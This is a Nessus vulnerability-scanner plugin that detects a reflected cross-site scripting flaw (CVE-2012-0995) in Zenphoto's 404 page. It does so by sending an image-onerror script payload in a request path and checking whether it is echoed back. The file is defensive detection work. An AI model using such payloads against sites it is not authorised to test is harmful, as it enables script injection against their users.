#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(58455);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/04/14 20:50:07 $");

  script_cve_id("CVE-2012-0995");
  script_bugtraq_id(51916);
  script_osvdb_id(78979, 78980, 78981, 78982);

  script_name(english:"Zenphoto 404 Error Page XSS");
  script_summary(english:"Attempts to exploit the vulnerability");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host contains a Zenphoto installation that is affected by a
cross-site scripting vulnerability.

User-supplied input that is appended to the end of a URL is not
validated properly before being sent to the browser in a custom 404
page and can result in an attacker-controlled script running in the
user's browser.

The install is also likely affected by several other vulnerabilities,
including PHP code execution, SQL injection, and other cross-site
scripting issues.  This plugin does not, though, check for them.");

  script_set_attribute(attribute:"see_also", value:"https://www.htbridge.ch/advisory/HTB23070");
  script_set_attribute(attribute:"see_also", value:"http://www.zenphoto.org/news/zenphoto-1.4.2.1");
  script_set_attribute(attribute:"solution", value:"Upgrade to Zenphoto 1.4.2.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Zenphoto 1.4.2 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/01/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/02/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/03/23");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:zenphoto:zenphoto");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("zenphoto_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/zenphoto");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
install = get_install_from_kb(appname:'zenphoto', port:port, exit_on_fail:TRUE);

dir = install['dir'];
xss = "<img+src=x+onerror=alert('"+SCRIPT_NAME+"')>/";
# Request to a non-existent dir
url = dir + '/1/nessus_xss_attempt/' + xss;

expected_resp_1 = 'The Zenphoto object you are requesting cannot be found.<br />Album: 1/nessus_xss_attempt';
expected_resp_2 = "<br />Image: <img src=x onerror=alert('"+SCRIPT_NAME+"')>";

res = http_send_recv3(
  port         : port,
  method       : "GET",
  item         : url,
  fetch404     : TRUE,
  exit_on_fail : TRUE
);

if (expected_resp_1 >< res[2] && expected_resp_2 >< res[2])
{
  set_kb_item(name:"www/"+port+"/XSS", value:TRUE);
  if (report_verbosity > 0)
  {
    output = (strstr(res[2], 'The Zenphoto object') - strstr(res[2], 'Powered by'));

    report =
      '\nNessus was able to verify the issue exists using the following request :' +
      '\n' +
      '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) +
      '\n' + http_last_sent_request() +
      '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n';

    if (report_verbosity > 1)
    {
      report +=
        '\n' + 'This produced the following output :' +
        '\n' +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
        '\n' + chomp(output) +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }

    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else exit(0, "The Zenphoto install at " + build_url(qs:dir, port:port) + " is not affected.");
